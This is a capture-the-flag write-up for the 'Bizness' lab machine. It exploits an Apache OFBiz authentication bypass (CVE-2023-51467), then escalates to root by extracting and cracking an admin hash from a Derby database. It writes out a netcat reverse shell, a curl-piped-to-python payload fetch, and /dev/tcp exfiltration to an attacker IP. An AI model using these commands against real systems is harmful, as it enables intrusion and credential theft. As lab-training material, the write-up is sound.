---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Bizness

## Enum

```
┌──(kali㉿kali)-[/s]
└─$ sudo nmap bizness.htb -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-11 11:16 EST
Nmap scan report for biziness.htb (10.10.11.252)
Host is up (0.040s latency).
rDNS record for 10.10.11.252: biziness
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
45419/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 17.14 seconds
```

## Web (80)

Add `10.10.11.252 bizness.htb` to `/etc/hosts`.

There is a web application.

### Directory search

```bash
feroxbuster --url https://bizness.htb/ --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php -k
# -> https://bizness.htb/control
# -> https://bizness.htb/webtools/control/login
```

The webpage `https://bizness.htb/control` reveals the software used:

```
ERROR MESSAGE
org.apache.ofbiz.webapp.control.RequestHandlerException: Unknown request [control]; this request does not exist or cannot be called directly.

Apache OfBiz
```

`http://bizness.htb/webtools/control/ping?USERNAME&PASSWORD=test&requirePasswordChange=Y`

Vulnerable CVE-2023-51467

### CVE-2023-51467

```
# sortof working exploit, run with python3 ofbiz_exploit.py https://bizness.htb shell 10.10.14.181:1234 -- try a few times, it worked for me after a few tries
https://github.com/UserConnecting/Exploit-CVE-2023-49070-and-CVE-2023-51467-Apache-OFBiz.git
```

#### Alternative

1. Get the PoC `https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass`
2. Run: `python3 exploit.py --url https://bizness.htb/ --cmd 'nc -e /bin/sh 10.10.14.188 8888'`
3. Update the shell to some nicer one, like: https://github.com/infodox/python-pty-shells Prepare shell handler (let it run)

   ```
   python2 tcp_pty_shell_handler.py -b 0.0.0.0:9999
   ```

   Run HTTP server to host the shell script

   ```
   python3 -m http.server 7777
   ```

   Call the following on the ugly shell

   ```
   curl 10.10.14.188:7777/tcp_pty_backconnect.py | python3
   ```

That gives us user `ofbiz` and the user flag.

## -> Root

### Linpeas

Noting really interesting is found there.

### Derby database

The web app must run some sort of database to support login. So where is it? The database is stored in `/opt/ofbiz/runtime/data` and it is a `derby` database. Now to look there for the password.

```bash
# archive the database
tar -cf /tmp/db.tar /opt/ofbiz/runtime/data

# download the database by SCP
scp ofbiz@bizness.htb:/tmp/db.tar db.tar
# or by NC
nc -lvnp 4444 > db.tar
cat /tmp/db.tar > /dev/tcp/10.10.14.188/4444

# unarchive
tar -xf db.tar

# install derby client
sudo apt install derby-tools

# start and connect
┌──(kali㉿kali)-[/s/…/ofbiz/runtime/data/derby]                                                     
└─$ ij                                                                                                                
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
ij version 10.14
ij> connect 'jdbc:derby:./ofbiz';
ij> help;
ij> SHOW TABLES;
ij> SELECT * FROM OFBIZ.USER_LOGIN;
```

#### ALTERNATIVE to the derby client

1. grep the database `grep -R -i Password`
2. Oh shit, it's binary
3. so grep it to file `grep -R -i -a Password > /tmp/whatever`
4. now, open it with `less` and scroll (with space)

```
seg0/c54d0.dat:                <eeval-UserLogin createdStamp="2023-12-16 03:40:2
3.643" createdTxStamp="2023-12-16 03:40:23.445" currentPassword="$SHA$d$uP0_QaVB
pDWFeo8-dRzDqRwXQ2I" enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2023-12-16 0
3:44:54.272" lastUpdatedTxStamp="2023-12-16 03:44:54.213" requirePasswordChange=
"N" userLoginId="admin"/>
```

### Cracking the hash

So we have hash: `$SHA$d$uP0_QaVB pDWFeo8-dRzDqRwXQ2I`

The hash is in a wacky format (see [GitHub](https://github.com/apache/ofbiz/blob/trunk/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java#L143) to reverse engineer). The hash is in SHA1 and `d` is used as salt. We can get it in a hexform with the help of [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9-_',false,false)To_Hex('None',0)&input=dVAwX1FhVkJwRFdGZW84LWRSekRxUndYUTJJ). This will yield the hash `b8fd3f41a541a435857a8f3e751cc3a91c174362`. We need to *append* the salt to the hash. See `hashcat --example-hashes`, search for SHA1 with salt for the right mode.

```bash
# hash: b8fd3f41a541a435857a8f3e751cc3a91c174362:d
hashcat -m 120 hash /usr/share/wordlists/rockyou.txt
```

Connect with ssh, do `su root` and be happy.